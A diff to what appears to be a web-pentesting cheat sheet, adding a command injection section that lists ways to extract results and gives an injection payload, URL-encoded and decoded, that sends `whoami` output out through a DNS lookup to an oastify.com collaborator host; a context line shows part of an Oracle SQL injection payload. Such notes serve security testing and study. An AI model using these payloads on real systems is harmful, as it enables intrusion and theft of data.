@@ -43,10 +43,15 @@ Oracle - `'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?
 ### Authentication
 ### Path traversal
 ### Command injection
+_Burp suite extension : Active scan++ | Collaborator everywhere_
+The main command injection objective is to extract data. Multiple ways to achieve this :
+- Results reflected on the website
+- Results written in non accessible files in the server (leverage with SSRF maybe)
+- Results extracted with DNS request e.g. `test%40test.fr%7cnslookup%20-q%3dcname%20%60whoami%60.8y7ds87rolk2iziyuihztmwqwh28q0ep.oastify.com.%26` i.e. ``test@test.fr|nslookup -q=cname `whoami`.8y7ds87rolk2iziyuihztmwqwh28q0ep.oastify.com.&``
+
 ### Business logic vulnerabilities
 ### Information disclosure
 ### Access control
-### Command injection
 ### File upload
 _Burp suite extension : Upload Scanner_
 
